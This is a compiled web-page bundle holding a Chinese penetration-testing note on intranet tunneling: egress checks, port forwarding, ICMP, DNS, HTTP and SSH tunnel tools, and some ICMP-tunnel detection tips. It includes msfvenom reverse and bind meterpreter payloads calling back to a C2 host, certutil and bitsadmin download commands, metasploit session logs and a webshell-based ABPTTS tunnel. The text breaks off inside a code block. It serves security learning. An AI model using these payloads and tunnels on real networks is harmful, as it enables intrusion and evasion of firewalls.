import{_ as t}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as l,o as r,c as d,a as e,b as i,d as n,e as a}from"./app-gUuvRBJC.js";const p="/DailyNotes/assets/image-20231024221510922-ZOoVzy8z.png",o="/DailyNotes/assets/image-20231024221606350-hVr52-aE.png",c="/DailyNotes/assets/image-20231024222915343-BWR9z4fG.png",u="/DailyNotes/assets/image-20231024222949808-uHSTJp29.png",h="/DailyNotes/assets/image-20240115154056893-1vs8NHeS.png",v="/DailyNotes/assets/image-20240115154019407-JCO4V_5a.png",m={},b=e("h1",{id:"内网穿透-隧道",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#内网穿透-隧道","aria-hidden":"true"},"#"),i(" 内网穿透-隧道")],-1),g={href:"https://blog.csdn.net/m0_74131821/article/details/130322657",target:"_blank",rel:"noopener noreferrer"},x=a(`<h2 id="_1-内网穿透概述" tabindex="-1"><a class="header-anchor" href="#_1-内网穿透概述" aria-hidden="true">#</a> 1. 内网穿透概述</h2><h3 id="_1-1-概述" tabindex="-1"><a class="header-anchor" href="#_1-1-概述" aria-hidden="true">#</a> 1.1 概述</h3><blockquote><p>参考链接：https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/</p></blockquote><p>内网穿透：利用各种隧道技术，寻找防火墙允许的协议，混杂在正常流量中穿透，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p><p>隧道技术：一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程，使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。</p><ul><li>封装：隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递</li><li>传输：被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道</li><li>解包：一旦到达网络终点，数据将被解包并转发到最终目的地</li></ul><p>隧道协议的主要作用包括：<strong>规避防火墙</strong>、<strong>绕过出网协议的限制</strong>、<strong>加密网络流量</strong>。</p><p>常见的隧道列举如下：</p><ul><li>应用层：SSH、HTTP、HTTPS、DNS。</li><li>传输层：TCP、UDP、常规端口转发。</li><li>网络层：IPv6、ICMP、GRE。</li></ul><blockquote><p>关于木马通信使用的协议演变历史可参考：https://cloud.tencent.com/developer/article/1832949?from=article.detail.1419096</p></blockquote><h3 id="_1-2-内网主机出网方式" tabindex="-1"><a class="header-anchor" href="#_1-2-内网主机出网方式" aria-hidden="true">#</a> 1.2 内网主机出网方式</h3><h4 id="_1-icmp协议出网" tabindex="-1"><a class="header-anchor" href="#_1-icmp协议出网" aria-hidden="true">#</a> (1) ICMP协议出网</h4><p>网络防火墙允许ICMP协议出网，即能ping通外网主机。判断是否允许ICMP协议出网的方式</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ping ip/domain
tracert ip/domain
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>若只允许ICMP协议出网，可以通过ICMP隧道来解决，也可以解决IPS对HTTP等流量类型检测比较严格问题</p><h4 id="_2-传输层特定端口出网" tabindex="-1"><a class="header-anchor" href="#_2-传输层特定端口出网" aria-hidden="true">#</a> (2) 传输层特定端口出网</h4><p>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</p><p>判断方式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>telnet ip port   #TCP
nc -zv ip port   #TCP
nc -zuv ip port  #UDP
curl/wget certutil等判断http出网的话、TCP就能出网
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在一个不能出网的网络环境里面，将所有的TCP和UDP端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：比如网络管理员配置允许Web服务器访问另一主机的mysql数据库的3306端口，网络管理员配置时偷懒，可能会直接放行Web服务器到任意IP的3306端口。</p><p>这种情况就其实就属于能出网了，不需要网络隧道，只需要攻击者本地监听防火墙允许出网的端口，让目标主机将shell反弹到该端口即可。</p><h4 id="_3-特定的应用层协议出网" tabindex="-1"><a class="header-anchor" href="#_3-特定的应用层协议出网" aria-hidden="true">#</a> (3) 特定的应用层协议出网</h4><p>（比如HTTP、SSH、DNS等应用层协议）</p><p>网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议</p><p>判断方式-HTTP/HTTPS：(下面的URL中的http均可替换成https)</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>linux:
curl http://ip or domain
wget http://ip or domain

Windows: 
start http://www.baidu.com
explorer http://www.baidu.com
certutil.exe -urlcache -split -f http://ip:port/xxx
bitsadmin /transfer 任务名 http://ip:port/xxx 绝对路径\\文件名
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断DNS出网</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>linux：
dig @8.8.8.8 www.baidu.com
nslookup www.baidu.com 8.8.8.8

windows：
nslookup www.baidu.com 8.8.8.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断SSH出网</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>netstat -ntlp |grep ssh
ssh -p 22 user@ip   #试一下就知道了
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-3-端口映射和端口转发" tabindex="-1"><a class="header-anchor" href="#_1-3-端口映射和端口转发" aria-hidden="true">#</a> 1.3 端口映射和端口转发</h3><h4 id="_1-端口映射" tabindex="-1"><a class="header-anchor" href="#_1-端口映射" aria-hidden="true">#</a> (1) 端口映射</h4><p>端口映射的使用，以下图为例，这是一个在渗透测试中，比较常见的场景：</p><p>一个hacker通过扫描暴露到公网中的主机A ，主机A开放了一些敏感端口，而且是弱口令，导致主机A被hacker完全控制。 接着hacker就想往公司内网中渗透，通过在主机A监控流量或者扫描的方式，发现了主机B，但是主机B只能由主机A进行访问，开放了80端口，而且没有公网IP。 如果hacker想直接访问主机B的 80端口，对上面的Web服务进行继续渗透，这就需要进行端口映射，让hacker可以远程连接到80端口。</p><p>从上图场景中看，端口映射是将内网主机B的80端口映射到了具有公网IP的主机A上，本质上是将一个本来无法访问的端口映射到可以访问的IP上了</p><h4 id="_2-端口转发" tabindex="-1"><a class="header-anchor" href="#_2-端口转发" aria-hidden="true">#</a> (2) 端口转发</h4><p>端口转发又是另外一个场景，在渗透测试中，也很常见。如下图所示：</p><p>hacker位于主机A，主机A可能是个人电脑，也可能是hacker控制的主机。 hacker通过发送恶意邮件的方式给主机B，主机B的用户点开邮件，运行恶意木马导致主机B被感染，就成了我们俗称的“肉鸡”。虽然已经有木马运行在主机B中，但是由于主机B不在公网中，hacker无法访问到主机B。 主机B运行着ssh服务，开放着22端口，hacker如果想在主机A上直接连接主机B的22端口，执行shell命令，这就需要端口转发。</p><p>这就需要一台主机C，一个公网的VPS（去阿里云或者腾讯云买）</p><p>木马的服务端运行在主机C，同时监听两个端口 port1 与port2 木马的客户端运行在主机B，分别主动连接主机B的22端口和主机C的port2 hacker只需要主动连接主机C的port1，这样就打通了到主机B 22端口的线路</p><h2 id="_2-隧道工具" tabindex="-1"><a class="header-anchor" href="#_2-隧道工具" aria-hidden="true">#</a> 2. 隧道工具</h2><h3 id="_2-1-网络层隧道工具" tabindex="-1"><a class="header-anchor" href="#_2-1-网络层隧道工具" aria-hidden="true">#</a> 2.1 网络层隧道工具</h3><blockquote><p>ICMP协议出网</p></blockquote><h4 id="_1-使用场景及原理" tabindex="-1"><a class="header-anchor" href="#_1-使用场景及原理" aria-hidden="true">#</a> (1) 使用场景及原理</h4><p><strong>使用场景</strong></p><p>1）某主机只允许ICMP协议出网，只需要将ICMP隧道工具客户端放到目标主机上并执行</p><p>2）防火墙不限制ICMP协议或检测能力较弱</p><p>3）目标主机配置了微隔离(不禁ping，不出网，只有web服务的固定端口可访问)，只有一个webshell，想要上线其他C2工具</p><p>4）用作权限维持，将攻击者的控制流量隐藏在ICMP流量中</p><p><strong>原理</strong></p><p>关于ICMP请求，Windows和Linux是不同的：</p><ul><li><p>Windows系统默认传输32 bytes的数据，内容是固定的<code>abcdefghijklmnopqrstuvwabcdefghi</code>，ping包的大小是可以改变的，但是内容依旧不变，且请求和响应内容相同</p></li><li><p>Linux系统默认传输48 bytes的数据，头信息比较复杂，但是末尾内容是固定<code>!”#$%&amp;’()+,-./01234567</code></p></li></ul><p>下图报文142和143为Windows系统的Request和Reply包。</p><figure><img src="`+p+'" alt="image-20231024221510922" tabindex="0" loading="lazy"><figcaption>image-20231024221510922</figcaption></figure><figure><img src="'+o+'" alt="image-20231024221606350" tabindex="0" loading="lazy"><figcaption>image-20231024221606350</figcaption></figure><p>下图报文7和10为Linux系统的Request和Reply包。</p><figure><img src="'+c+'" alt="image-20231024222915343" tabindex="0" loading="lazy"><figcaption>image-20231024222915343</figcaption></figure><figure><img src="'+u+'" alt="image-20231024222949808" tabindex="0" loading="lazy"><figcaption>image-20231024222949808</figcaption></figure><p><strong>ICMP隐蔽隧道的原理</strong>：替换Data部分，利用客户端程序进行接收并处理服务端发送的畸形的ICMP协议（主要是Request和Reply包）</p><p><strong>检测方式</strong>：</p><ul><li>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道在同一时间会产生上千个 ICMP 数据包。</li><li>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</li><li>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包（当然有的工具可以配置限制所有数据包的payload为64比特，这样会使得更难以被检测到）。</li><li>检查ICMP数据包的协议标签，例如icmptunnel工具会在所有的payload前面增加<code>TUNL</code>标记以用于识别隧道，这就是特征。</li></ul><h4 id="_2-icmp隧道工具" tabindex="-1"><a class="header-anchor" href="#_2-icmp隧道工具" aria-hidden="true">#</a> (2) ICMP隧道工具</h4>',62),P=e("strong",null,"ptunnel",-1),T={href:"https://www.kali.org/tools/ptunnel/",target:"_blank",rel:"noopener noreferrer"},f=e("strong",null,"参考文档",-1),_={href:"https://echo0d.github.io/DailyNotes/AD/Tools/Tunnel.html#_1-1-ptunnel",target:"_blank",rel:"noopener noreferrer"},k=e("ul",null,[e("li",null,[e("strong",null,"pingtunnel"),i("：https://github.com/esrrhs/pingtunnel")])],-1),C={href:"https://echo0d.github.io/DailyNotes/AD/Tools/Tunnel.html#_1-2-pingtunnel",target:"_blank",rel:"noopener noreferrer"},w=a(`<ul><li>icmpsh：https://github.com/bdamele/icmpsh</li></ul><p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用。可参考：https://www.freebuf.com/news/210450.html</p><ul><li>icmptunnel：https://github.com/DhavalKapil/icmptunnel</li></ul><p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p><h4 id="_3-上线仅icmp协议出网的内网主机" tabindex="-1"><a class="header-anchor" href="#_3-上线仅icmp协议出网的内网主机" aria-hidden="true">#</a> (3)上线仅ICMP协议出网的内网主机</h4><p>通过某种信道获取了内网主机的shell，但是当前信道不适合做远控（比如站库分离的网站，我们通过SQL注入获取了数据库服务器的shell，但是数据库服务器只有ICMP协议可以出网）</p><p>ICMP协议可以出网，可以利用ICMP协议，构建反向的TCP over ICMP隧道或者SOCKS over ICMP隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过ICMP隧道转发TCP、UDP、socks5连接</p><h5 id="icmp隧道转发socks上线metasploit" tabindex="-1"><a class="header-anchor" href="#icmp隧道转发socks上线metasploit" aria-hidden="true">#</a> ICMP隧道转发socks上线metasploit</h5><ul><li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./pingtunnel <span class="token parameter variable">-type</span> server <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1:6688 <span class="token parameter variable">-s</span> icmpserver_ip <span class="token parameter variable">-sock5</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span>
<span class="token comment"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span>
<span class="token comment"># icmpserver_ip 192.168.1.10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>c2_server_ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8443</span> <span class="token assign-left variable">HttpProxyType</span><span class="token operator">=</span>SOCKS <span class="token assign-left variable">HttpProxyHost</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token assign-left variable">HttpProxyPort</span><span class="token operator">=</span><span class="token number">6688</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> meterpreter.exe
<span class="token comment"># c2_server_ip 192.168.1.10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动msf监听，等待meterpreter执行上线</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 8443
lport =&gt; 8443
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 0.0.0.0:8443 
[*] Sending stage (200774 bytes) to 192.168.1.11
[*] Meterpreter session 2 opened (192.168.1.10:8443 -&gt; 192.168.1.11:49967) at 2024-01-15 02:39:34 -0500

meterpreter &gt; getuid
Server username: ECHO0D-WIN\\echo0d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+h+'" alt="image-20240115154056893" tabindex="0" loading="lazy"><figcaption>image-20240115154056893</figcaption></figure><figure><img src="'+v+`" alt="image-20240115154019407" tabindex="0" loading="lazy"><figcaption>image-20240115154019407</figcaption></figure><h5 id="icmp隧道转发socks上线cobaltstrike" tabindex="-1"><a class="header-anchor" href="#icmp隧道转发socks上线cobaltstrike" aria-hidden="true">#</a> ICMP隧道转发socks上线cobaltstrike</h5><ul><li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./pingtunnel -type server -noprint 1 -nolog 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1

# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>cobaltstrike创建listener 这里的代理可以是socks或者HTTP，好像cobaltstrike不支持socks5代理，这里并不能成功上线 这里也可以使用HTTP代理，不过需要工具将HTTP代理转为socks5代理，比如privoxy</p></li><li><p>选择创建的listener生成beacon上传到目标执行即可上线</p></li></ul><h3 id="_2-1-传输层隧道工具" tabindex="-1"><a class="header-anchor" href="#_2-1-传输层隧道工具" aria-hidden="true">#</a> 2.1 传输层隧道工具</h3><p>（1）netcat 官网：https://eternallybored.org/misc/netcat/</p><p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p><p>（2）powercat github：https://github.com/besimorhino/powercat</p><p>powershell版的netcat</p><p>（3）socat github：https://github.com/erluko/socat</p><p>具有记录转发流的功能，方便查看转发内容，需要安装</p><p>（4）netsh 官网：https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts</p><p>windows系统自带的网络配置工具</p><p>（5）lcx github：https://github.com/windworst/LCX</p><p>基于socket套接字实现的端口转发工具，从linux下的htran移植给Windows的</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>//内网机器10.0.0.1的3389端口，转发到公网9000端口
lcx.exe -slave 192.168.1.161 9000 10.0.0.1 3389 

//公网机器192.168.1.1，将本机端口9000上监听的所有数据转发到本机5555上
lcx.exe -listen 9000 5555
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>（6）NATBypass github：https://github.com/cw1997/NATBypass</p><p>一款lcx在golang下的实现,更好的跨平台，更完善的文档</p><p>（7）iox github：https://github.com/EddieIvan01/iox</p><p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台</p><p>缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p><p>（8）frp github：https://github.com/fatedier/frp</p><p>用Go写的，支持TCP和UDP，以及HTTP和HTTPS协议，同时也支持P2P，仍在持续更新</p><h3 id="_2-3-应用层隧道工具" tabindex="-1"><a class="header-anchor" href="#_2-3-应用层隧道工具" aria-hidden="true">#</a> 2.3 应用层隧道工具</h3><p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等</p><p>（1）dnscat2 github：https://github.com/iagox86/dnscat2</p><p>IP over DNS通过 DNS 协议创建加密的命令和控制 (C&amp;C) 通道，看起来厉害极了</p><p>可参考：</p><p>https://cloud.tencent.com/developer/article/1474644?from=article.detail.1552172 https://cloud.tencent.com/developer/article/1419096 （2）dnscat2-powershell github：https://github.com/lukebaggett/dnscat2-powershell</p><p>dnscat2的powershell客户端</p><p>（3）dns2tcp 使用文档 github：https://github.com/alex-sector/dns2tcp</p><p>TCP over DNS，即通过DNS隧道转发TCP连接，没有加密。采用直连，但速度不是特别乐观，优势在于kali直接集成了这个工具，部分linux发行版也都可以直接通过包工具下载，相对方便</p><p>可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096</p><p>（4）iodine github：https://github.com/yarrick/iodine</p><p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包，在编码，请求类型上提供了更丰富的选择，而且在速度方面更快</p><p>可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096</p><p>（5）reGeorg github：https://github.com/sensepost/reGeorg</p><p>SOCKS over HTTP，即通过HTTP隧道转发SOCKS，用Python写的，基于Python2.7和urllib3，上传一个Tunnel脚本，然后远程连接转发端口即可建立socket代理隧道</p><p>对于aspx的网站假如总是报错，可以尝试ashx脚本 PHP程序确认php.ini中socket模块正常开启并且可用，reGeorge也提供了nosocket脚本 linux下利用proxychains，Windows下利用proxifier实现任意应用通过代理 假如绑定某些端口会遇到socket无法建立连接时，尝试着利用80、53等穿透性强的端口 （6）Neo-reGeorg github：https://github.com/L-codes/Neo-reGeorg</p><p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p><p>根据作者说法：</p><p>传输内容经过变形 base64 加密，伪装成 base64 编码 直接请求响应可定制化 (如伪装的404页面) HTTP Headers 的指令随机生成，避免特征检测 HTTP Headers 可定制化 自定义 HTTP 响应码 多 URL 随机请求 服务端 DNS 解析 兼容 python2 / python3 服务端环境的高兼容性 (仅 php) 参考 pivotnacci 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景 aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行 支持内网转发，应对负载均衡环境 （7）reDuh github：https://github.com/sensepost/reDuh</p><p>TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定</p><p>（8）Tunna github：https://github.com/SECFORCE/Tunna</p><p>TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p><p>（9）ABPTTS github：https://github.com/nccgroup/ABPTTS</p><p>TCP over HTTP，即通过HTTP隧道转发TCP连接</p><p>数据加密，可自定义HTTP数据 对抗特征检测十分优秀 创建的隧道十分稳定 比较遗憾的是支持的web脚本类型只有aspx和jsp （10）EarthWorm（EW） 官网：http://rootkiter.com/EarthWorm/ github：https://github.com/rootkiter/Binary-files 下载：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e</p><p>十分方便的多级SOCKS代理，已经永久停止更新，五种管道：</p><p>ssocksd : 正向代理 rssocks : 反向代理 lcx_slave： 该管道一侧通过反弹方式连接代理请求，另一侧连接代理提供主机 lcx_tran : 该管道通过监听本地端口代理请求，并转发给代理提供主机 lcx_listen : 该管道通过监听本地端口接收数据，并将其转发给目标网络回连的代理提供主机 （11）Termite 官网：http://rootkiter.com/Termite/ github：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e</p><p>EarthWorm的升级版，已经永久停止更新</p><p>（12）Venom github：https://github.com/Dliv3/Venom/</p><p>Venom是一款基于ssh隧道，为渗透测试人员设计的使用Go开发的多级代理工具</p><p>据作者说：</p><p>可视化网络拓扑 多级socks5代理 多级端口转发 端口复用 (apache/mysql/…) ssh隧道 交互式shell 文件的上传和下载 节点间通信加密 支持多种平台(Linux/Windows/MacOS)和多种架构(x86/x64/arm/mips) （13）ssocks github：https://github.com/54Pany/sSocks</p><p>正向和反向的socks工具，可执行文件的大小很小，支持socks5验证，支持IPV6和UDP</p><p>（14）s5.go github：https://github.com/ring04h/s5.go</p><p>go语言编写的socks服务工具，良好的跨平台特性</p><p>（15）ssh ssh本身可以用来做隧道，如果没被限制的话</p><p>本地转发：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1
#ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由服务端转发到114.114.114.114:9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>远程转发：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1
#ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>动态转发：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1
#ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>构建ssh隧道的常用参数:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-C 压缩传输，提高传输速度
-f 后台执行数据传输
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发，即SOCKS代理
-p 指定ssh连接端口
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="三、内网穿透场景" tabindex="-1"><a class="header-anchor" href="#三、内网穿透场景" aria-hidden="true">#</a> 三、内网穿透场景</h2><h3 id="_1、上线零出网的内网主机" tabindex="-1"><a class="header-anchor" href="#_1、上线零出网的内网主机" aria-hidden="true">#</a> 1、上线零出网的内网主机</h3><h4 id="_1-背景" tabindex="-1"><a class="header-anchor" href="#_1-背景" aria-hidden="true">#</a> （1）背景</h4><p>获取了webshell的主机位于内网</p><p>ICMP等网络层协议不能出网 TCP和UDP等传输层协议不能出网 DNS、HTTP等应用层协议也不能出网 唯一的数据通道是反向代理入网的web应用</p><h4 id="_2-方案" tabindex="-1"><a class="header-anchor" href="#_2-方案" aria-hidden="true">#</a> （2）方案</h4><p>利用反向代理入网的web应用所在的HTTP连接，构建正向的TCP over HTTP隧道。通过这条隧道，我们可以向内网主机发起TCP连接。生成bind类型的payload，通过webshell上传执行就会监听一个端口，我们的远控平台通过构建的TCP over HTTP隧道，去连接监听的端口即可上线</p><p>能构建TCP over HTTP的隧道的工具有ABPTTS、Tunna、reDuh等，由于Tunna、reDuh构建的tcp连接不稳定，这里选用ABPTTS</p><h4 id="_3-过程" tabindex="-1"><a class="header-anchor" href="#_3-过程" aria-hidden="true">#</a> （3）过程</h4><h5 id="上线metasploit" tabindex="-1"><a class="header-anchor" href="#上线metasploit" aria-hidden="true">#</a> 上线metasploit</h5><ul><li>通过正向的HTTP隧道构建TCP连接</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 配置abptts运行环境
# 注意windows安装pycrypto库需要先安装依赖http://aka.ms/vcpython27

pip install httplib2
pip install pycrypto

# 生成server端脚本

python abpttsfactory.py -o server

# 上传server端脚本到web服务器，客户端运行以下命令

python abpttsclient.py -c server/config.txt -u &quot;http://192.168.168.10/abptts.aspx&quot; -f 127.0.0.1:7777/127.0.0.1:8888

# abptts客户端监听127.0.0.1:7777，通过http://192.168.168.10/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>生成bind类型的payload，通过webshell上传执行</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 这里的rhost和lport是转发的目的IP和端口

msfvenom -p windows/meterpreter/bind_tcp rhost=127.0.0.1 lport=8888 -f exe -o meterpreter.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>启动msf监听，等待meterpreter执行上线</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#这里的rhost和lport是abptts客户端监听的IP和端口，msf所在主机必须能访问到这个IP和端口，这里msf和abptts在同一个主机上

msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp
msf5 exploit(multi/handler) &gt; set rhost 127.0.0.1
rhost =&gt; 127.0.0.1
msf5 exploit(multi/handler) &gt; set lport 7777
lport =&gt; 7777
msf5 exploit(multi/handler) &gt; run

[*] Started bind TCP handler against 127.0.0.1:7777
[*] Sending stage (180291 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 127.0.0.1:7777) at 2020-04-27 04:50:25 -0400

meterpreter &gt; getuid
Server username: DESKTOP-0AH7FQ0\\admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="上线cobaltstrike" tabindex="-1"><a class="header-anchor" href="#上线cobaltstrike" aria-hidden="true">#</a> 上线cobaltstrike</h5><p>由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。</p><ul><li>通过正向的http隧道构建tcp连接</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 配置abptts运行环境

